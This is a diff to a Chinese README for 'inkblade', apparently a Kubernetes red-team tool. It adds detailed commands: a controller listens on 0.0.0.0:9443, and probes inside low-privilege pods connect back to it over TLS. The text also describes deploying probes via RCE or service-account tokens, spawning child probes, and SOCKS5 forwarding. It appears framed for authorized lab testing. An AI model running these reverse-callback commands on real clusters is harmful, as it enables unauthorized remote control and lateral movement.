@@ -46,14 +46,20 @@ python -m inkblade up --no-consent
 默认立足点是普通、最低权限的 Pod：非 root、无 hostPath/privileged、无 kubeconfig，只有出站 TCP。探针主动回连控制端：
 
 ```bash
-python -m inkblade probe list
-python -m inkblade channel listen
+python -m inkblade channel listen \
+  --bind 0.0.0.0 --port 9443 --transport tls \
+  --token-file ./probe.token --workspace local-lab
 ```
 
-在 Pod 内让探针回连：
+在 Pod 内让探针主动回连（`channel listen` 会输出 `ca.pem` 与 pin）：
 
 ```bash
-inkblade-probe reverse --host <controller> --port <port>
+./inkblade-probe reverse \
+  --transport tls \
+  --host <controller> --port 9443 \
+  --ca-file ca.pem --pin <sha256> --sni <name> \
+  --token-file /tmp/probe.token \
+  --probe-id pod-a
 ```
 
 `probe list` 列出工作区里已登记的探针（`probe_id`、父探针、状态、目标）。`channel listen` 等待探针连接；子探针由父探针用 `probe upload` + `probe spawn` 投放，并以同样方式回连。存在本地命令通道时仍可用 stdio 通道（`channel start --session <id>`）；SOCKS5 与端口转发只绑 `127.0.0.1`。已有探针不需要重新投放，也不需要 kubeconfig。
@@ -81,7 +87,12 @@ python -m inkblade probe deploy \
 随后在 Pod 内让探针回连控制端：
 
 ```bash
-inkblade-probe reverse --host <controller> --port <port>
+./inkblade-probe reverse \
+  --transport tls \
+  --host <controller> --port 9443 \
+  --ca-file ca.pem --pin <sha256> --sni <name> \
+  --token-file /tmp/probe.token \
+  --probe-id pod-a
 ```
 
 `--credential-source` 可取 `pod-shell`、`sa-token` 或 `rce`；`--via` 用 `rce` 或 `sa-token` 投放。`--via rce` 适合非 root、无 hostPath/privileged 的低权限 Pod。没有 shell、只有可达服务时，先用 `session open --mode external --target <target> --proof @proof.json` 建立有界证明，再经授权 RCE/回调投放。
